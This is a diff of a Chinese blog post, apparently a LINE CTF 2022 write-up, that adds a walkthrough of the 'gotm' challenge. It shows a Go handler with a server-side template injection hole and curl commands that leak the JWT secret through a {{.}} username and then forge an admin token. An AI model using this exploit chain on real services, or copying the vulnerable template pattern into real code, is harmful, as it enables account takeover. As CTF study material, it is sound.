@@ -27,11 +27,13 @@
 <meta property="og:site_name" content="b1ue0cean&#39;s   blog">
 <meta property="og:description" content="web题复现title todo解这个题需要先了解几个知识点">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/04/12/LINECTF2022/MyBlog/b1ue0cean.github.io/source_posts/LINECTF2022/image-20220503221616032.png">
 <meta property="article:published_time" content="2022-04-12T12:17:20.000Z">
-<meta property="article:modified_time" content="2022-04-28T04:06:26.835Z">
+<meta property="article:modified_time" content="2022-05-03T14:49:08.705Z">
 <meta property="article:author" content="b1ue0cean">
 <meta property="article:tag" content="xss">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/04/12/LINECTF2022/MyBlog/b1ue0cean.github.io/source_posts/LINECTF2022/image-20220503221616032.png">
 
 
 <link rel="canonical" href="http://example.com/2022/04/12/LINECTF2022/">
@@ -93,7 +95,7 @@
         <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
         <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">14</span></a></li>
         <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">8</span></a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">32</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">33</span></a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
         </a>
@@ -165,7 +167,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-count">33</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -268,7 +270,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-04-28 12:06:26" itemprop="dateModified" datetime="2022-04-28T12:06:26+08:00">2022-04-28</time>
+      <time title="Modified: 2022-05-03 22:49:08" itemprop="dateModified" datetime="2022-05-03T22:49:08+08:00">2022-05-03</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -328,7 +330,18 @@
 
 <h4 id="参考大佬文章"><a href="#参考大佬文章" class="headerlink" title="参考大佬文章"></a>参考大佬文章</h4><p><a target="_blank" rel="noopener" href="https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e">https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/#title-todo">https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/#title-todo</a></p>
-<h2 id="gotm"><a href="#gotm" class="headerlink" title="gotm"></a>gotm</h2>
+<h2 id="gotm"><a href="#gotm" class="headerlink" title="gotm"></a>gotm</h2><p><img src="/2022/04/12/LINECTF2022/MyBlog\b1ue0cean.github.io\source_posts\LINECTF2022\image-20220503221616032.png" alt="image-20220503221616032"></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">root_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	token := r.Header.Get(<span class="string">&quot;X-Token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		id, _ := jwt_decode(token)</span><br><span class="line">		fmt.Println(id)</span><br><span class="line">		acc := get_account(id)</span><br><span class="line">		fmt.Println(acc)</span><br><span class="line">		tpl, err := template.New(<span class="string">&quot;&quot;</span>).Parse(<span class="string">&quot;Logged in as &quot;</span> + acc.id)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		&#125;</span><br><span class="line">		tpl.Execute(w, &amp;acc)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先注册一个账户 名为 <code>&#123;&#123;.&#125;&#125;</code></p>
+<p>然后改一下 jwt</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># curl <span class="string">&quot;http://127.0.0.1:2333/regist&quot;</span> --<span class="keyword">data</span>  <span class="string">&#x27;id=&#123;&#123;.&#125;&#125;&amp;pw=2333&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;status&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"># curl <span class="string">&quot;http://127.0.0.1:2333/auth&quot;</span> --<span class="keyword">data</span>  <span class="string">&#x27;id=&#123;&#123;.&#125;&#125;&amp;pw=2333&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;status&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;token&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.82TiASACxvlXOXaMfkfl7UzypVvaWRJni-D22e2iT7E&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"># curl <span class="string">&#x27;http://127.0.0.1:2333&#x27;</span> -H <span class="string">&#x27;X-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.82TiASACxvlXOXaMfkfl7UzypVvaWRJni-D22e2iT7E&#x27;</span></span><br><span class="line">Logged <span class="keyword">in</span> <span class="keyword">as</span> &#123;&#123;&#123;.&#125;&#125; <span class="number">2333</span> <span class="literal">false</span> this_is_fake_key&#125;</span><br><span class="line"></span><br><span class="line">curl <span class="string">&#x27;http://127.0.0.1:2333&#x27;</span> -H <span class="string">&#x27;X-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOnRydWV9.BOQ0KkXZwK1G68VmU5brd04vL3iO6vTXu5MdXt5aoIE&#x27;</span></span><br><span class="line">Logged <span class="keyword">in</span> <span class="keyword">as</span> root</span><br></pre></td></tr></table></figure>
+
+<p>贴几个学习的链接</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#ssti-in-go">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#ssti-in-go</a></p>
+<p><a target="_blank" rel="noopener" href="https://tyskill.github.io/posts/gossti/">https://tyskill.github.io/posts/gossti/</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1286">https://forum.butian.net/share/1286</a></p>
+
     </div>
 
     
